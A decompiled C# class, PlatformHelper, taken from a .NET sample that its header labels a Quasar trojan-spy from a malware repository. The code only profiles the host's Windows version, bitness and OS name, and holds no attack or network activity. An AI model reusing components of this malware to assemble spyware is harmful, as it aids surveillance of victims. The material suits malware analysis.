// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Data.WMI.PlatformHelper
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;
using System.Text.RegularExpressions;

namespace NoiseMe.Drags.App.Data.WMI
{
  public static class PlatformHelper
  {
    static PlatformHelper()
    {
      PlatformHelper.Win32NT = Environment.OSVersion.Platform == PlatformID.Win32NT;
      PlatformHelper.XpOrHigher = PlatformHelper.Win32NT && Environment.OSVersion.Version.Major >= 5;
      PlatformHelper.VistaOrHigher = PlatformHelper.Win32NT && Environment.OSVersion.Version.Major >= 6;
      PlatformHelper.SevenOrHigher = PlatformHelper.Win32NT && Environment.OSVersion.Version >= new Version(6, 1);
      PlatformHelper.EightOrHigher = PlatformHelper.Win32NT && Environment.OSVersion.Version >= new Version(6, 2, 9200);
      PlatformHelper.EightPointOneOrHigher = PlatformHelper.Win32NT && Environment.OSVersion.Version >= new Version(6, 3);
      PlatformHelper.TenOrHigher = PlatformHelper.Win32NT && Environment.OSVersion.Version >= new Version(10, 0);
      PlatformHelper.RunningOnMono = Type.GetType("Mono.Runtime") != null;
      PlatformHelper.Name = "Unknown OS";
      try
      {
        PlatformHelper.Name = OsGatherer.GetCaption();
      }
      catch
      {
      }
      PlatformHelper.Name = Regex.Replace(PlatformHelper.Name, "^.*(?=Windows)", "").TrimEnd().TrimStart();
      string environmentVariable = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
      PlatformHelper.Is64Bit = !string.IsNullOrEmpty(environmentVariable) && string.Compare(environmentVariable, 0, "x86", 0, 3, true) != 0;
      PlatformHelper.FullName = string.Format("{0} {1} Bit", (object) PlatformHelper.Name, (object) (PlatformHelper.Is64Bit ? 64 : 32));
    }

    public static string FullName { get; private set; }

    public static string Name { get; private set; }

    public static bool Is64Bit { get; private set; }

    public static bool RunningOnMono { get; private set; }

    public static bool Win32NT { get; private set; }

    public static bool XpOrHigher { get; private set; }

    public static bool VistaOrHigher { get; private set; }

    public static bool SevenOrHigher { get; private set; }

    public static bool EightOrHigher { get; private set; }

    public static bool EightPointOneOrHigher { get; private set; }

    public static bool TenOrHigher { get; private set; }
  }
}
